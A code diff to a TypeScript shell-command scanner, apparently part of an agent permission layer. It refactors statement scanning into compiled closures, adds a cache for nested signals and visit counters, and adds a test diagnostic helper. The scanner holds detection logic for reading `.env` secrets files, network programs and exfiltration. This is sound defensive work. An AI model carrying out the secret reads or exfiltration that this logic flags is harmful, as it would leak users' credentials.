-      state.metadataListing = isMetadataListing(statement, state);
+      const hidden = needsCodeTextScan(statement);
+      const network = statement.words.length > 0 && isNetworkProgram(commandArgv(statement));
+      const embedded = statement.words.filter((word) => !isNonFileUrlArgument(staticShellWord(word) ?? word.source.raw));
+      let envFile = false;
       for (const word of statement.words) {
         const text = wordText(word);
         if (text === "--") break;
-        if (text === "--env-file") checkGlob(escapeGlob(".env"), state);
+        if (text === "--env-file") envFile = true;
       }
-      if (needsCodeTextScan(statement)) {
-        state.hidden = true;
-        scanCodeOf(statement, state);
-      } else {
-        // Embedded literal paths remain a floor without a program-option model. Here-document data is inspected as code only when the recipient runs it.
-        for (const word of statement.words) {
-          const text = staticShellWord(word) ?? word.source.raw;
-          if (!isNonFileUrlArgument(text)) scanWordCodeText(word, state);
+      return (state) => {
+        // `env -C`, `git -C`, `make -C`, `tar -C`, `--prefix` … move this command alone.
+        const restoreCwd = applyCommandCwdSwitch(statement, state);
+        const metadataListing = state.metadataListing;
+        state.metadataListing = isMetadataListing(statement, state);
+        if (envFile) checkGlob(escapeGlob(".env"), state);
+        if (hidden) {
+          state.hidden = true;
+          scanCodeOf(statement, state);
+        } else {
+          // Embedded literal paths remain a floor without a program-option model. Here-document data is inspected as code only when the recipient runs it.
+          for (const word of embedded) scanWordCodeText(word, state);
         }
-      }
-      if (statement.words.length > 0 && isNetworkProgram(commandArgv(statement))) state.network = true;
-      for (const word of statement.words) checkWord(word, state);
-      if (statement.words.length > 0) {
-        scanGitObjectPaths(statement, state);
-        scanRecursiveSearch(statement, state);
-      }
-      for (const assignment of statement.assignments) {
-        checkWord(assignment.value, state);
-        for (const element of assignment.elements ?? []) checkWord(element, state);
-      }
-      for (const redirect of statement.redirects) {
-        if (redirect.target) scanRedirectTarget(redirect.target, state);
-        // Here-document text is data, but substitutions inside it run.
-        for (const part of redirect.data?.parts ?? []) if (part.kind === "substitution") scanStatement(part.body, state);
-      }
-      restoreCwd?.();
-      state.metadataListing = metadataListing;
-      state.cdSuccess = undefined;
-      if (statement.words.length > 0) trackDirectoryChange(statement, state);
-      return;
+        if (network) state.network = true;
+        for (const word of statement.words) checkWord(word, state);
+        if (statement.words.length > 0) {
+          scanGitObjectPaths(statement, state);
+          scanRecursiveSearch(statement, state);
+        }
+        for (const assignment of statement.assignments) {
+          checkWord(assignment.value, state);
+          for (const element of assignment.elements ?? []) checkWord(element, state);
+        }
+        for (const redirect of statement.redirects) {
+          if (redirect.target) scanRedirectTarget(redirect.target, state);
+          // Here-document text is data, but substitutions inside it run.
+          for (const part of redirect.data?.parts ?? []) if (part.kind === "substitution") scanStatement(part.body, state);
+        }
+        restoreCwd?.();
+        state.metadataListing = metadataListing;
+        state.cdSuccess = undefined;
+        if (statement.words.length > 0) trackDirectoryChange(statement, state);
+        return;
+      };
     }
     case "pipeline": {
-      const groups = statement.statements.map(commandsIn);
-      const stages = groups.flat();
-      if (stages.some(needsCodeTextScan)) for (const stage of stages) scanCodeOf(stage, state);
-      const hasXargs = groups.map((group) => group.some(isXargsCommand));
+      const range = commandRange(statement, source);
+      const groups = statement.statements.map((stage) => commandRange(stage, source));
+      const hasXargs = groups.map((group) => group.xargs);
       const suffixXargs = new Array<boolean>(groups.length);
       let later = false;
       for (let index = groups.length - 1; index >= 0; index -= 1) {
         suffixXargs[index] = later;
         later ||= hasXargs[index]!;
       }
-      const upstream: ShellCommand[] = [];
-      const checked = new Map<string, number>();
-      for (let index = 0; index < statement.statements.length; index += 1) {
-        const { feedsXargs, xargsUpstream } = state;
-        state.feedsXargs = suffixXargs[index]!;
-        state.xargsUpstream = hasXargs[index] ? { commands: upstream, length: upstream.length, checked } : undefined;
-        scanStatement(statement.statements[index]!, state);
-        state.feedsXargs = feedsXargs;
-        state.xargsUpstream = xargsUpstream;
-        upstream.push(...groups[index]!);
-      }
-      state.cdSuccess = undefined;
-      return;
+      return (state) => {
+        if (range.hidden) scanRangeCode(range, state);
+        const checked = new Map<string, number>();
+        for (let index = 0; index < statement.statements.length; index += 1) {
+          const { feedsXargs, xargsUpstream } = state;
+          state.feedsXargs = suffixXargs[index]!;
+          state.xargsUpstream = hasXargs[index] ? { commands: range.inventory.commands, start: range.start, length: groups[index]!.start - range.start, checked } : undefined;
+          scanStatement(statement.statements[index]!, state);
+          state.feedsXargs = feedsXargs;
+          state.xargsUpstream = xargsUpstream;
+
+        }
+        state.cdSuccess = undefined;
+        return;
+      };
     }
-    case "sequence":
+    case "sequence": return (state) => {
       for (const child of statement.statements) scanStatement(child, state);
       state.cdSuccess = undefined;
       return;
-    case "and": {
+    };
+    case "and": return (state) => {
       // The right side runs only after the left succeeded: a static `cd` on the left is the right side's whole cwd. Afterwards the left may have failed instead, so every candidate stays (`cd x && y; z`).
       scanStatement(statement.left, state);
       const success = state.cdSuccess;
@@ -1582,57 +1959,71 @@ function scanStatement(statement: ShellStatement, state: ScanState): void {
       state.cwds = [...new Set([...candidates, ...state.cwds])];
       state.cdSuccess = rightSuccess;
       return;
-    }
-    case "or":
+    };
+    case "or": return (state) => {
       scanStatement(statement.left, state);
       scanStatement(statement.right, state);
       state.cdSuccess = undefined;
       return;
-    case "subshell": case "background": case "negate":
+    };
+    case "subshell": case "background": case "negate": return (state) => {
       scanStatement(statement.body, state);
       state.cdSuccess = undefined;
       return;
-    case "function":
+    };
+    case "function": return (state) => {
       // The body runs where the function is called, which may be after a later `cd`.
       scanStatement(statement.body, state);
-      state.functions.push({ body: statement.body, version: state.cwdVersion });
+      const existing = state.functionsByBody.get(statement.body);
+      if (existing) existing.version = state.cwdVersion;
+      else {
+        const fn = { body: statement.body, version: state.cwdVersion };
+        state.functions.push(fn);
+        state.functionsByBody.set(statement.body, fn);
+        state.functionRegistryVersion += 1;
+      }
       state.cdSuccess = undefined;
       return;
-    case "redirected": {
+    };
+    case "redirected": return (state) => {
       for (const redirect of statement.redirects) if (redirect.target) scanRedirectTarget(redirect.target, state);
       state.cdSuccess = undefined;
       // `cd x 2>/dev/null && …`: the redirection does not change what success means.
       scanStatement(statement.body, state);
       return;
-    }
-    case "for":
+    };
+    case "for": return (state) => {
       for (const value of statement.values ?? []) checkWord(value, state);
       // A later iteration runs in the directory an earlier one changed to.
       scanUntilCwdStable(() => scanStatement(statement.body, state), state);
       state.cdSuccess = undefined;
       return;
-    case "while":
+    };
+    case "while": return (state) => {
       scanUntilCwdStable(() => {
         scanStatement(statement.condition, state);
         scanStatement(statement.body, state);
       }, state);
       state.cdSuccess = undefined;
       return;
-    case "if":
+    };
+    case "if": return (state) => {
       scanStatement(statement.condition, state);
       scanStatement(statement.consequent, state);
       scanStatement(statement.alternate, state);
       state.cdSuccess = undefined;
       return;
-    case "unsupported":
+    };
+    case "unsupported": return (state) => {
       state.hidden = true;
       if (NETWORK_DEVICE.test(statement.source.raw) || NETWORK_WORD.test(statement.source.raw)) state.network = true;
       scanCodeText(statement.source.raw, state);
       state.cdSuccess = undefined;
       return;
+    };
     default: {
       const exhaustive: never = statement;
-      void exhaustive;
+      return () => { void exhaustive; };
     }
   }
 }
@@ -1665,13 +2056,20 @@ function scanParsedInto(parsed: ParsedShellCommand, state: ScanState): void {
     state.network ||= NETWORK_DEVICE.test(visible) || NETWORK_WORD.test(visible);
     scanCodeText(visible, state);
   } else {
+    commandRange(parsed.analysis.program, state);
     scanStatement(parsed.analysis.program, state);
-    // Rescan function bodies against directories added after their definition.
-    for (let stale = state.functions.find((fn) => fn.version !== state.cwdVersion); stale && !state.sensitive;
-      stale = state.functions.find((fn) => fn.version !== state.cwdVersion)) {
-      stale.version = state.cwdVersion;
-      scanStatement(stale.body, state);
-    }
+    // Source bodies compile once. Propagate only newly added cwd contexts;
+    // membership stays fixed during replay and scheduler versions are not keys.
+    let version: number;
+    do {
+      version = state.cwdVersion;
+      for (const fn of state.functions) {
+        if (state.sensitive) break;
+        if (fn.version === state.cwdVersion) continue;
+        fn.version = state.cwdVersion;
+        scanStatement(fn.body, state);
+      }
+    } while (version !== state.cwdVersion && !state.sensitive);
   }
 }
 
@@ -1704,10 +2102,16 @@ function signalFor(command: string, ctx: Context): string | null {
   if (shellFloorInputExceeded(command)) throw new ShellScanLimitError(SHELL_FLOOR_BUDGET_REASON);
   const parsed = floorParsedCommand(command, ctx.scan.context);
   floorContexts.set(parsed, ctx.scan.context);
+  const key = JSON.stringify([command, ctx.cwd, ctx.depth, [...ctx.tainted].sort(), scanContextKey(ctx.scan)]);
+  const cached = ctx.scan.nestedSignals.get(key);
+  if (cached !== undefined) { applyScanEffects(ctx.scan, cached.effects); return cached.signal; }
+  ctx.scan.context.visits.frames += 1;
   const specific = signalForParsed(parsed, ctx);
-  if (specific) return specific;
+  if (specific) { ctx.scan.nestedSignals.set(key, { signal: specific, effects: scanEffects(ctx.scan) }); return specific; }
   scanParsedInto(parsed, ctx.scan);
-  return readerIndependentSignal(ctx.scan);
+  const result = readerIndependentSignal(ctx.scan);
+  ctx.scan.nestedSignals.set(key, { signal: result, effects: scanEffects(ctx.scan) });
+  return result;
 }
 
 function signalForParsed(parsed: ParsedShellCommand, ctx: Context): string | null {
@@ -1786,6 +2190,7 @@ function floorParsedCommand(input: ShellCommandInput, context: ShellFloorContext
   const key = typeof input === "string" ? `bash-parse\0${input}` : undefined;
   const cached = key === undefined ? undefined : context.facts.get(key) as ParsedShellCommand | undefined;
   if (cached !== undefined) return cached;
+  context.visits.lexes += 1;
   const parsed = parseShellFloorCommand(input);
   floorContexts.set(parsed, context);
   if (key !== undefined) context.facts.set(key, parsed);
@@ -1803,4 +2208,12 @@ export function inspectShellCommand(input: ShellCommandInput, cwd?: string, cont
     const ordinaryAsk = scan.ordinaryAsk ?? scan.cdAsk ?? scan.confinedAsk;
     return { sensitive, exfiltration, ...(ordinaryAsk ? { ordinaryAsk } : {}) };
   }));
+}
+
+// Diagnostics are observational and never enter a permission verdict.
+export function _inspectShellForTest(input: ShellCommandInput, cwd?: string) {
+  const context = new ShellFloorContext();
+  context.visits.frames += 1;
+  const signals = inspectShellCommand(input, cwd, context);
+  return { ...signals, visits: { ...context.visits } };
 }
